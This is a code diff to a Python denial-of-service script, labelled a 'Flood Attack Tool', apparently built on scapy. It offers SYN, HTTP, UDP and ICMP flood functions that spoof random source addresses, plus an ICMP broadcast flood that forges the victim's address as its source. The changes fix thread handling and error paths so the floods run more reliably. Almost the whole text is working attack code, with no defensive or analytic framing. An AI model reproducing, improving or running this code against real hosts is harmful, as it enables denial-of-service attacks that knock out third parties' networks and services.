@@ -8,7 +8,7 @@ import time
 data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 # ICMP/UDP/TCP Flood Attack Tool
 def main():
-    print("______  _                    _     ___   _    _                 _      _____                _ ")
+    print("______  _                    _     ___   _    _                 _      _____                 _ ")
     print("|  ___|| |                  | |    / _ \ | |  | |               | |    |_   _|              | |")
     print("| |_   | |  ___    ___    __| |   / /_\ \| |_ | |_   __ _   ___ | | __   | |    ___    ___  | |")
     print("|  _|  | | / _ \  / _ \  / _` |   |  _  || __|| __| / _` | / __|| |/ /   | |   / _ \  / _ \ | |")
@@ -43,23 +43,21 @@ def main():
     elif args.HTTPFlood:
         target = HTTPFlood
     else:
-        print("Attack Type is Missing")
+        print("-"*35 + "Attack Type is Missing"+35*"-"+"\n")
         return
     
     threads =[]
     for _ in range(int(args.thread)):
-        t = threading.Thread(target=target,args=(dstIP,dstPort,repeat))
-        try:
-            t.start()
-        except:
-            print("Error Occured")
-            threads.append(t)
+        t = threading.Thread(target=target,args=(dstIP,dstPort,int(repeat)))
+        t.start()
+        threads.append(t)
     for thread in threads:
         thread.join()
 
 def randomSrcIP():
     ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
     return ip 
+
 def randomPort():
     port = randint(0, 65535)
     return port
@@ -77,7 +75,7 @@ def SynFlood(dstIP,dstPort,repeat):
         send(IP_Packet/TCP_Packet,verbose=0)
 
 def HTTPFlood(dstIP,dstPort,repeat):
-    for x in range(int(repeat)):
+    for x in range(repeat):
         IP_Packet = IP()
         IP_Packet.dst = dstIP
         IP_Packet.src = randomSrcIP()
@@ -92,16 +90,16 @@ def HTTPFlood(dstIP,dstPort,repeat):
         packet_SynAck = sr1(syn,timeout=1)
 
         if(packet_SynAck is None):
-            print("Syn+Ack Segment is Filtered\n")
-            return
+            print("-"*35 + "ACK+SYN Packet is Filtered"+35*"-"+"\n")
+            continue
         TCP_Packet.flags="A"
         TCP_Packet.seq = packet_SynAck[TCP].ack
         TCP_Packet.ack= packet_SynAck[TCP].seq+1
         getStr='GET / HTTP/1.0\n\n'
-        sr1(IP_Packet/TCP_Packet/getStr)
+        send(IP_Packet/TCP_Packet/getStr)
 
 def UDPFlood(dstIP,dstPort,repeat):
-    for x in range(int(repeat)):
+    for x in range(repeat):
         IP_Packet = IP()
         IP_Packet.src = randomSrcIP()
         IP_Packet.dst = dstIP
@@ -111,8 +109,7 @@ def UDPFlood(dstIP,dstPort,repeat):
         send(IP_Packet/UDP_Packet/Raw(load=data))
 
 def ICMPFlood(dstIP,dstPort,repeat):
-    
-    for x in range(int(repeat)):
+    for x in range(repeat):
         IP_Packet = IP()
         IP_Packet.src = dstIP
         IP_Packet.dst = "255.255.255.255"
